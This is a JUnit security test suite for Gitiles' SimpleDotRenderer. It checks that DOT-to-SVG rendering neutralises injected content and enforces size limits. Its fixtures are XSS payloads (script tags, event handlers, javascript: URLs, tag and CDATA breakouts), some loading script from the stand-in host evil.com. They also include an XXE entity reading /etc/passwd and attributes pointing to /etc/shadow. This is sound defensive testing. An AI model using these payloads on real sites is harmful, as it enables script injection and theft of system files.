// Copyright 2026 The Android Open Source Project
//
// Licensed under the Apache License, Version 2.0 (the "License");
// you may not use this file except in compliance with the License.
// You may obtain a copy of the License at
//
// http://www.apache.org/licenses/LICENSE-2.0
//
// Unless required by applicable law or agreed to in writing, software
// distributed under the License is distributed on an "AS IS" BASIS,
// WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
// See the License for the specific language governing permissions and
// limitations under the License.

package com.google.gitiles.doc;

import static com.google.common.truth.Truth.assertThat;

import java.util.Arrays;
import java.util.List;
import java.util.Optional;
import org.junit.Test;
import org.junit.runner.RunWith;
import org.junit.runners.JUnit4;

/**
 * Security test suite for {@link SimpleDotRenderer} covering SVG/XSS injection vectors, HTML-like
 * label rejection, CSS color allowlisting, external resource attribute filtering, and DoS limits.
 */
@RunWith(JUnit4.class)
public class SimpleDotRendererSecurityTest {

  // =========================================================================
  // 1. Script Tag Variations in Node IDs, Node Labels, Edge Labels, Clusters
  // =========================================================================

  @Test
  public void testScriptTagVariationsInNodeIdsAndLabels() {
    List<String> payloads =
        Arrays.asList(
            "<script>alert(1)</script>",
            "<script src='https://evil.com/xss.js'></script>",
            "<script src='//evil.com/xss.js'/>",
            "<sCrIpT>alert('case')</ScRiPt>",
            "<SCRIPT/SRC=\"data:text/javascript,alert(1)\">",
            "<script xmlns=\"http://www.w3.org/1999/xhtml\">alert(1)</script>",
            "<script><![CDATA[alert(1)]]></script>",
            "<script defer>alert(1)</script>",
            "<script type=\"module\">import 'https://evil.com/x.js';</script>");

    for (String payload : payloads) {
      String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");

      // In node label
      String labelDot = "digraph G {\n  A [label=\"" + escaped + "\"];\n  A -> B;\n}\n";
      assertSafeDotSvg(labelDot, payload);

      // In quoted node ID
      String idDot = "digraph G {\n  \"" + escaped + "\" -> B;\n}\n";
      assertSafeDotSvg(idDot, payload);
    }
  }

  @Test
  public void testScriptTagVariationsInEdgeLabelsAndClusterTitles() {
    List<String> payloads =
        Arrays.asList(
            "<script>alert('edge-or-cluster')</script>",
            "<iframe src='javascript:alert(1)'></iframe>",
            "<img src=x onerror=alert('onerror')>",
            "<svg onload=alert('onload')>",
            "<foreignObject><script>alert(1)</script></foreignObject>");

    for (String payload : payloads) {
      String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");

      // In edge label
      String edgeDot = "digraph G {\n  A -> B [label=\"" + escaped + "\"];\n}\n";
      assertSafeDotSvg(edgeDot, payload);

      // In cluster title
      String clusterDot =
          "digraph G {\n"
              + "  subgraph cluster_sec {\n"
              + "    label=\""
              + escaped
              + "\";\n"
              + "    A -> B;\n"
              + "  }\n"
              + "}\n";
      assertSafeDotSvg(clusterDot, payload);
    }
  }

  // =========================================================================
  // 2. ForeignObject, Iframe, Event Handlers, and CDATA/XML Breakouts
  // =========================================================================

  @Test
  public void testForeignObjectIframeEventHandlersAndBreakoutPayloads() {
    List<String> payloads =
        Arrays.asList(
            "<foreignObject><body"
                + " xmlns=\"http://www.w3.org/1999/xhtml\"><script>alert(1)</script></body></foreignObject>",
            "<foreignObject><iframe src=\"javascript:alert(1)\"></iframe></foreignObject>",
            "<img src=\"invalid.jpg\" onerror=\"alert('img-onerror')\">",
            "<svg onload=\"alert('svg-onload')\">",
            "<rect onmouseover=\"alert('rect-hover')\">",
            "<a href=\"javascript:alert('a-href')\">Click Link</a>",
            "<animate onbegin=\"alert('anim')\" attributeName=\"x\" dur=\"1s\" />",
            "<use href=\"javascript:alert(1)\" />",
            "</text></svg><script>alert('tag-breakout')</script><svg><text>",
            "</tspan></text><iframe src='javascript:alert(1)'></iframe><text><tspan>",
            "]]><script>alert('cdata-breakout')</script><![CDATA[",
            "<!DOCTYPE svg [ <!ENTITY xxe SYSTEM \"file:///etc/passwd\"> ]>&xxe;",
            "'\"><script>alert('quote-breakout')</script>");

    for (String payload : payloads) {
      String escaped = payload.replace("\\", "\\\\").replace("\"", "\\\"");
      String dot = "digraph G {\n  A [label=\"" + escaped + "\"];\n  A -> B;\n}\n";
      assertSafeDotSvg(dot, payload);
    }
  }

  // =========================================================================
  // 3. HTML-Like Label Rejection (<...>)
  // =========================================================================

  @Test
  public void testHtmlLikeLabelsRejected() {
    assertThat(
            SimpleDotRenderer.renderToSvg(
                "digraph G {\n  A [label=<<table><tr><td>Cell</td></tr></table>>];\n  A -> B;\n}"))
        .isEmpty();

    assertThat(
            SimpleDotRenderer.renderToSvg(
                "digraph G {\n  A [label=<<script>alert(1)</script>>];\n  A -> B;\n}"))
        .isEmpty();

    assertThat(
            SimpleDotRenderer.renderToSvg(
                "digraph G {\n  A -> B [label=<<b>bold</b>>];\n}"))
        .isEmpty();
  }

  // =========================================================================
  // 4. CSS Color Injection Rejection
  // =========================================================================

  @Test
  public void testCssColorInjectionPayloadsRejected() {
    String dot =
        """
        digraph ColorInjection {
          A [
            shape=box,
            style=filled,
            color="red; background:url(javascript:alert(1))",
            fillcolor="expression(alert(1))",
            fontcolor="#000000\\" onload=\\"alert(1)"
          ];
          B [
            shape=box,
            style=filled,
            color="<script>alert(1)</script>",
            fillcolor="url(https://evil.com/track.png)"
          ];
          A -> B [color="blue; stroke:url(javascript:alert(1))"];
        }
        """;

    SvgDoc svg = SvgDoc.renderDot(dot);
    svg.assertNoDangerousTags();

    String raw = SimpleDotRenderer.renderToSvg(dot).get();
    assertThat(raw).doesNotContain("javascript:");
    assertThat(raw).doesNotContain("expression(");
    assertThat(raw).doesNotContain("onload=");
    assertThat(raw).doesNotContain("evil.com");
    assertThat(raw).doesNotContain("background:url");
  }

  // =========================================================================
  // 5. Dangerous External Resource and Navigation Attribute Filtering
  // =========================================================================

  @Test
  public void testDangerousAttributesFiltered() {
    String dot =
        """
        digraph DangerousAttrs {
          URL="javascript:alert('graph-url')";
          href="https://evil.com/graph";
          A [
            label="Safe Node A",
            URL="javascript:alert('node-url')",
            href="javascript:alert('node-href')",
            target="_blank",
            image="https://evil.com/evil.svg",
            shapefile="/etc/passwd",
            fontpath="/etc/shadow"
          ];
          B [label="Safe Node B"];
          A -> B [
            label="Safe Edge",
            URL="javascript:alert('edge-url')",
            href="https://evil.com/edge"
          ];
        }
        """;

    SvgDoc svg = SvgDoc.renderDot(dot);
    svg.assertNoDangerousTags();

    assertThat(svg.getElementsByTag("a")).isEmpty();
    assertThat(svg.getElementsByTag("image")).isEmpty();
    assertThat(svg.getElementsByTag("img")).isEmpty();

    String raw = SimpleDotRenderer.renderToSvg(dot).get();
    assertThat(raw).doesNotContain("javascript:");
    assertThat(raw).doesNotContain("evil.com");
    assertThat(raw).doesNotContain("/etc/passwd");
    assertThat(raw).doesNotContain("/etc/shadow");
    assertThat(raw).doesNotContain("href=");
    assertThat(raw).doesNotContain("xlink:href");
  }

  // =========================================================================
  // 6. Resource Bounds (> 65,536 bytes, > 400 nodes, > 1,000 edges) & Fuzzing
  // =========================================================================

  @Test
  public void testOversizedInputBytesRejected() {
    StringBuilder sb = new StringBuilder();
    sb.append("digraph Oversized {\n");
    String padding = "x".repeat(1000);
    for (int i = 0; i < 70; i++) {
      sb.append("  N").append(i).append(" [label=\"").append(padding).append("\"];\n");
    }
    sb.append("}\n");

    assertThat(sb.length()).isGreaterThan(65_536);
    assertThat(SimpleDotRenderer.renderToSvg(sb.toString())).isEmpty();
  }

  @Test
  public void testExcessiveNodeCountRejected() {
    StringBuilder sb = new StringBuilder();
    sb.append("digraph TooManyNodes {\n");
    for (int i = 0; i <= 405; i++) {
      sb.append("  N").append(i).append(";\n");
    }
    sb.append("}\n");

    assertThat(SimpleDotRenderer.renderToSvg(sb.toString())).isEmpty();
  }

  @Test
  public void testExcessiveEdgeCountRejected() {
    StringBuilder sb = new StringBuilder();
    sb.append("digraph TooManyEdges {\n");
    int edgeCount = 0;
    for (int i = 0; i < 40 && edgeCount <= 1005; i++) {
      for (int j = 0; j < 40 && edgeCount <= 1005; j++) {
        if (i != j) {
          sb.append("  N").append(i).append(" -> N").append(j).append(";\n");
          edgeCount++;
        }
      }
    }
    sb.append("}\n");

    assertThat(SimpleDotRenderer.renderToSvg(sb.toString())).isEmpty();
  }

  @Test
  public void testNullEmptyAndMalformedInputsHandledCleanly() {
    assertThat(SimpleDotRenderer.renderToSvg(null)).isEmpty();
    assertThat(SimpleDotRenderer.renderToSvg("")).isEmpty();
    assertThat(SimpleDotRenderer.renderToSvg("   \n\t  ")).isEmpty();
    assertThat(SimpleDotRenderer.renderToSvg("// only a comment\n")).isEmpty();
    assertThat(SimpleDotRenderer.renderToSvg("not a dot graph")).isEmpty();
    assertThat(SimpleDotRenderer.renderToSvg("digraph {}")).isEmpty();
    assertThat(SimpleDotRenderer.renderToSvg("digraph {")).isEmpty();
    assertThat(SimpleDotRenderer.renderToSvg("digraph { A -> }")).isEmpty();
    assertThat(SimpleDotRenderer.renderToSvg("digraph { A [label=\"unclosed string]; }")).isEmpty();

    // Control characters and null bytes inside valid DOT labels are stripped safely
    String dotWithControlChars = "digraph G {\n  A [label=\"Safe\0Null\u0001Ctrl\u0007Bell\"];\n  A -> B;\n}\n";
    SvgDoc svg = SvgDoc.renderDot(dotWithControlChars);
    svg.assertNoDangerousTags();
  }

  // =========================================================================
  // Helper Methods
  // =========================================================================

  private static void assertSafeDotSvg(String dotCode, String originalPayload) {
    Optional<String> svgOpt = SimpleDotRenderer.renderToSvg(dotCode);
    assertThat(svgOpt).isPresent();

    String rawSvg = svgOpt.get();
    for (String tag : SvgDoc.DANGEROUS_TAGS) {
      assertThat(rawSvg).doesNotContain("<" + tag);
      assertThat(rawSvg).doesNotContain("</" + tag + ">");
    }

    SvgDoc svg = new SvgDoc(rawSvg);
    svg.assertAllDotInvariants();
    assertThat(svg.findText(originalPayload)).isNotNull();
  }
}
